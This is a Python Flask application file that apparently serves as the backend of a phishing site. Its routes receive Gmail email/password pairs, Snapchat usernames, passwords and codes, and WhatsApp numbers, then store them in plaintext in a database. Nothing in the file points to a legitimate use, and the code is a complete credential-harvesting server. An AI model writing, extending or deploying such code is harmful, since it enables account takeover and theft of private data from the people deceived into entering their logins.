from flask import Flask, render_template, jsonify, request
from flask_sqlalchemy import SQLAlchemy
from dotenv import load_dotenv
import os
from flask_migrate import Migrate

basedir = os.path.abspath(os.path.dirname(__file__))
dotenv_path = os.path.join(basedir, '.env')

load_dotenv(dotenv_path)

# create instance of the flask app
app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('SQLALCHEMY_DATABASE_URI')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
migrate = Migrate(app, db)


# DATABASE MODELS FOR THE APPLICATION
class WhatsApp(db.Model):
    __tablename__ = 'whatsapp'
    id = db.Column(db.Integer, primary_key=True)
    whatsapp_number = db.Column(db.String(120), unique=True, nullable=False)
    whatsapp_country = db.Column(db.String(120), unique=False, nullable=False)
    
class Gmail(db.Model):
    __tablename__ = 'gmail'
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(80), unique=False, nullable=False)
    
class SnapChat(db.Model):
    __tablename__ = 'snapchat'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(80), unique=False, nullable=False)
    code = db.Column(db.String(80), unique=False, nullable=False)


# ROUTES FOR THE APPLICATION
@app.route("/")
def index():
    return render_template("index.html")


@app.route("/submit-whatsapp-credentials", methods=["POST"])
def submit_whatsapp_credentials():
    try:
        whatsapp_number = request.form["whatsapp_number"]
        whatsapp_country = request.form["whatsapp_country"]
        # check if whatsapp account exists
        whatsapp_account = WhatsApp.query.filter_by(whatsapp_number=whatsapp_number).first()
        if whatsapp_account:
            return jsonify({"code": "error", "message": "Account already exists"})
        # Create a WhatsApp object
        whatsapp = WhatsApp(whatsapp_number=whatsapp_number, whatsapp_country=whatsapp_country)
        db.session.add(whatsapp)
        db.session.commit()
        return jsonify({"code": "success", "message": "Details submitted successfully"})
    except Exception as e:
        print(e)
        return jsonify({"code": "success", "message": "An error occurred while submitting the details"})


@app.route("/submit-gmail-credentials", methods=["POST"])
def submit_gmail_credentials():
    try:
        email = request.form["email"]
        password = request.form["password"]
        # check if gmail account exists
        gmail_account = Gmail.query.filter_by(email=email).first()
        if gmail_account:
            return jsonify({"code": "error", "message": "Account already exists"})
        # create a Gmail object
        gmail = Gmail(email=email, password=password)
        db.session.add(gmail)
        db.session.commit()
        return jsonify({"code": "success", "message": "Details submitted successfully"})
    except Exception as e:
        print(e)
        return jsonify({"code": "success", "message": "An error occurred while submitting the details"})
    
@app.route("/submit-snapchat-credentials", methods=["POST"])
def submit_snapchat_credentials():
    try:
        username = request.form["username"]
        password = request.form["password"]
        snapchat_code = request.form["snapchat_code"]
        # check if snapchat account exists
        snapchat_account = SnapChat.query.filter_by(username=username).first()
        if snapchat_account:
            return jsonify({"code": "error", "message": "Account already exists"})
        # create a SnapChat object
        snapchat = SnapChat(username=username, password=password, code=snapchat_code)
        db.session.add(snapchat)
        db.session.commit()
        return jsonify({"code": "success", "message": "Details submitted successfully"})
    except Exception as e:
        print(e)
        return jsonify({"code": "success", "message": "An error occurred while submitting the details"})
